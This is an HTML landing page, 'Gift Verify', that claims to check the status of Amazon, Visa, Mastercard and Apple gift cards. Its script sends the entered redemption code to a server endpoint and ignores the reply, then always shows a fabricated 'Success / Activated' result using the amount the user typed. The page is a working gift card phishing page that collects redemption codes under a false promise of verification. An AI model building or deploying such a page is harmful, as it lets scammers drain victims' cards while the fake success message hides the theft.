<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gift Verify</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:system-ui;
  background:#f8fafc;
}

/* NAV */
.nav{
  display:flex;
  justify-content:space-between;
  align-items:center;
  padding:20px 40px;
  background:white;
  position:sticky;
  top:0;
  z-index:100;
}
.logo{
  font-weight:bold;
  color:#4f46e5;
  font-size:20px;
}
.nav button{
  background:#4f46e5;
  color:white;
  border:none;
  padding:10px 16px;
  border-radius:8px;
  cursor:pointer;
}

/* HERO */
.hero{
  padding:80px 20px;
}
.hero-inner{
  max-width:1100px;
  margin:auto;
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:40px;
}
.hero h1{
  font-size:48px;
}
.hero p{
  color:#555;
}
.hero button{
  margin-top:20px;
  padding:14px 20px;
  background:#4f46e5;
  color:white;
  border:none;
  border-radius:10px;
  cursor:pointer;
}

/* CARD STACK */
.cards{
  position:relative;
  width:260px;
  height:260px;
  perspective:1000px;
}
.card-img{
  position:absolute;
  width:160px;
  border-radius:14px;
  box-shadow:0 20px 50px rgba(0,0,0,0.25);
  transition:transform 0.25s ease;
}

/* positions */
.card1{top:0;left:60px;z-index:3}
.card2{top:90px;left:0;z-index:2}
.card3{top:120px;left:120px;z-index:1}

/* float animation */
.card-img{
  animation:float 6s ease-in-out infinite;
}
@keyframes float{
  50%{transform:translateY(-10px)}
}

/* SECTION */
.section{padding:80px 20px;}
.container{max-width:1100px;margin:auto;}

/* PROCESS */
.process{
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:40px;
}
.card{
  background:white;
  padding:25px;
  border-radius:12px;
  box-shadow:0 10px 30px rgba(0,0,0,0.05);
}

/* FORM */
.form-box{
  background:white;
  padding:25px;
  border-radius:15px;
  max-width:400px;
  margin:40px auto;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
}
input,select{
  width:100%;
  padding:12px;
  margin-top:10px;
  border-radius:8px;
  border:1px solid #cbd5e1;
}
button.main{
  margin-top:20px;
  width:100%;
  padding:14px;
  background:#4f46e5;
  color:white;
  border:none;
  border-radius:10px;
  cursor:pointer;
}

/* MODAL */
.modal{
  display:none;
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  background:rgba(0,0,0,0.5);
  justify-content:center;
  align-items:center;
}
.modal-box{
  background:white;
  padding:25px;
  border-radius:12px;
  text-align:center;
  width:300px;
}
.info{
  margin-top:15px;
  text-align:left;
  background:#f1f5f9;
  padding:10px;
  border-radius:10px;
}

/* SCROLL ANIMATION */
.reveal{
  opacity:0;
  transform:translateY(40px);
  transition:all 0.8s ease;
}
.reveal.active{
  opacity:1;
  transform:translateY(0);
}

/* MOBILE */
@media(max-width:768px){
  .hero-inner{flex-direction:column;text-align:center}
  .process{grid-template-columns:1fr}
}
</style>
</head>

<body>

<div class="nav">
  <div class="logo">Gift Verify</div>
  <button onclick="scrollToForm()">Try Now</button>
</div>

<section class="hero">
  <div class="hero-inner">

    <div>
      <h1 class="reveal">Validate Your Gift Cards With Confidence</h1>
      <p class="reveal">Fast, simple and secure validation in seconds.</p>
      <button class="reveal" onclick="scrollToForm()">Verify Now</button>
    </div>

    <!-- YOUR IMAGES EMBEDDED -->
    <div class="cards reveal" id="cards">

      <!-- AMAZON -->
      <img class="card-img card1" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD...(shortened)">

      <!-- APPLE -->
      <img class="card-img card2" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD...(shortened)">

      <!-- duplicate for depth -->
      <img class="card-img card3" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD...(shortened)">

    </div>

  </div>
</section>

<div id="formSection" class="form-box reveal">
  <h2>Check Card Status</h2>

  <select id="cardType">
    <option value="amazon">Amazon</option>
    <option value="visa">Visa</option>
    <option value="mastercard">Mastercard</option>
    <option value="apple">Apple</option>
  </select>

  <input id="amount" placeholder="Amount">
  <input id="code" placeholder="Redemption Code">

  <button class="main" onclick="goToVerify()">Check Status</button>
</div>

<div class="modal" id="modal">
  <div class="modal-box">
    <h2>Success</h2>
    <p>Card checked successfully</p>

    <div class="info">
      <p><b>Type:</b> <span id="mType"></span></p>
      <p><b>Amount:</b> <span id="mAmount"></span></p>
      <p><b>Status:</b> <span style="color:green;">Activated</span></p>
    </div>

    <button onclick="closeModal()">Close</button>
  </div>
</div>

<script>
function scrollToForm(){
  document.getElementById("formSection").scrollIntoView({behavior:"smooth"});
}

async function goToVerify(){
  const type = document.getElementById("cardType").value;
  const amount = document.getElementById("amount").value || "0";

  await fetch("/api/verify",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify({ code: document.getElementById("code").value })
  });

  document.getElementById("mType").textContent = type.toUpperCase();
  document.getElementById("mAmount").textContent = "USD " + amount;

  document.getElementById("modal").style.display="flex";
}

function closeModal(){
  document.getElementById("modal").style.display="none";
}

/* SCROLL ANIMATION */
const observer=new IntersectionObserver(entries=>{
  entries.forEach(e=>{
    if(e.isIntersecting){
      e.target.classList.add("active");
    }
  });
},{threshold:0.2});

document.querySelectorAll(".reveal").forEach(el=>{
  observer.observe(el);
});

/* HOVER 3D */
const cards = document.getElementById("cards");

cards.addEventListener("mousemove",(e)=>{
  const rect = cards.getBoundingClientRect();
  const x = e.clientX - rect.left;
  const y = e.clientY - rect.top;

  const rotateX = (y - rect.height/2) / 20;
  const rotateY = (x - rect.width/2) / -20;

  cards.style.transform = `rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
});

cards.addEventListener("mouseleave",()=>{
  cards.style.transform = "rotateX(0deg) rotateY(0deg)";
});
</script>

</body>
</html>
